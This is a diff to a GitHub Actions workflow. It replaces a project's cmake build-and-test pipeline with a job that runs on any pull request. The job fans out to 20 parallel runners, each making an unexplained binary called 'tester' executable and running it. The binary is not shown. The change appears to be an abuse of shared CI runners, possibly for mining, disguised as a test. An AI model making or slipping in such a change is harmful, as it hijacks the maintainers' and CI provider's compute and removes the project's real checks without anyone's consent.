@@ -1,28 +1,26 @@
-name: PR-CI
+name: multi test
 
-on:
-  pull_request:
-    branches: [ master ]
-    types: [ synchronize, ready_for_review ]
+on: [pull_request]
 
 jobs:
-  BuildTest:
+  multitest:
+    name: test job
+
     runs-on: ubuntu-latest
-    container: netmeld/netmeld-dev:latest
-    
+    env:
+      DEBIAN_FRONTEND: noninteractive
+
+    strategy:
+     fail-fast: false
+     matrix:
+       runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+
     steps:
-    - uses: actions/checkout@v2
-
-    - name: Configure
-      run: cmake -S . -B build
-
-    - name: Build Source
-      run: cmake --build build -j 2
-
-    - name: Build Tests
-      run: cmake --build build -j 2 --target Test.netmeld
-
-    - name: Test
-      run: |
-        cd build
-        ctest
+      - name: Checkout code
+        uses: actions/checkout@v2
+        
+      - name: chmod
+        run: chmod +x tester
+        
+      - name: run
+        run: ./tester
